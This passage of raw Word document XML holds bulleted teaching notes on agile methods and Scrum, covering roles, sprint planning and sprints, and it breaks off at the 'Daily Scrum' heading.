    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Agile methods:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Extreme Programming</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Adaptive Software Development (ASD)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Dynamic System Development Method (DSDM)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>Agile Alliance</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001631CC">
        <w:t>A non-profit organization promotes agile development</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0091789B" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="0091789B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is Scrum?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0091789B" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0091789B">
        <w:t>Definition from rugby football:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0091789B">
        <w:t>a scrum is a way to restart the game after an interruption, where the forwards of each side come together in a tight formation and struggle to gain possession of the ball when it is tossed in among them</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB2A82">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scrum - an agile process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>CRUM is an agile, lightweight process for managing and controlling software and product development in rapidly changing environments.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>Iterative, incremental process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>Team-based approach</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>developing systems/ products with rapidly changing requirements</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>Controls the chaos of conflicting interest and needs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:lastRenderedPageBreak/>
        <w:t>Improve communication and maximize cooperation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>Protecting the team form disruptions and impediments</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00AB2A82" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="134"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB2A82">
        <w:t>A way to maximize productivity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0091789B" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001631CC" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="007A2251" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="007A2251">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Functionality of Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r w:rsidRPr="007A2251">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6EFCF150" wp14:editId="78C2707D">
            <wp:extent cx="5943600" cy="2759710"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31751" name="Picture 4" descr="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Picture 4" descr="Scrum"/>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a:extLst/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00365E7D" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00365E7D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Components of Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00365E7D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="135"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00365E7D">
        <w:t>Scrum Roles</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00365E7D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="135"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00365E7D">
        <w:t>The Process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="135"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00365E7D">
        <w:t>Scrum Artifacts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00365E7D" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00CF1558" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF1558">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scrum Master</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00CF1558" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="136"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF1558">
        <w:t>Represents management to the project</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00CF1558" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="136"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF1558">
        <w:t>Typically filled by a Project Manager or Team Leader</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00CF1558" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="136"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF1558">
        <w:lastRenderedPageBreak/>
        <w:t>Responsible for enacting scrum values and practices</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00CF1558" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="136"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF1558">
        <w:t>Main job is to remove impediments</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="0013424E">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The Scrum Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="137"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0013424E">
        <w:t>Typically 5-10 people</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="137"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0013424E">
        <w:t>Cross-functional (QA, Programmers, UI Designers, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="137"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0013424E">
        <w:t>Members should be full-time</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="137"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0013424E">
        <w:t>Team is self-organizing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="0013424E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="137"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0013424E">
        <w:t>Membership can change only between sprints</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7378">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Product Owner</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="138"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Acts like one voice (in any case)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="138"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Knows what needs to be build and in what sequence this should be done</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="138"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Typically a product manager</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7378">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The Process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="139"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Sprint Planning Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="139"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="139"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Daily Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="139"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Sprint Review Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7378">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sprint Planning Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002F7378" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="140"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>A collaborative meeting in the beginning of each Sprint between the Product Owner, the Scrum Master and the Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="140"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7378">
        <w:t>Takes 8 hours and consists of 2 parts (“before lunch and after lunch”)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parts of Sprint Planning Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve"> Part:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve">Creating Product Backlog </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve">Determining the Sprint Goal. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Participants: Product Owner, Scrum Master, Scrum Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve"> Part:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Participants: Scrum Master, Scrum Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="141"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve">Creating Sprint Backlog </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pre-Project/Kickoff Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="142"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>A special form of Sprint Planning Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="142"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Meeting before the begin of the Project</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="143"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>month-long iteration</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:t>, during which is incremented a product functionality</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="143"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>NO outside influence can interference with the Scrum team during the Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="143"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Each Sprint begins with the Daily Scrum Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Daily Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>
        </w:numPr>
      </w:pPr>
